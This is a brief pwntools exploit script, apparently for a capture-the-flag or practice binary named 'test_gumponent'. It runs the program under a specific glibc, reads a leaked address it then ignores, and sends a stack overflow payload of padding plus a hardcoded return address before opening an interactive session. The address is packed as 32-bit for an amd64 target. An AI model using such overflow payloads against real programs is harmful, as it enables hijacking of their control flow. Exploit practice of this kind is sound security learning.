from pwn import *
context(arch='amd64',terminal=['tmux','new-window'])

is_local= True
vuln_prog = "test_gumponent"
r = process(["/tmp/ld-2.34.so",f"./{vuln_prog}"],env={"LD_PRELOAD":"/glibc/2.34/64/lib/libc.so.6"})
f = ELF(vuln_prog)

def get_next_func_add(info):
	return int(info.split(' ')[-1].strip().encode(),16)

if __name__ == '__main__':
	info = r.recvline()
	next_func_add = get_next_func_add(info.decode())
	payload =b"a"*32+p32(0x401230)
	r.sendline(payload)
	r.interactive()


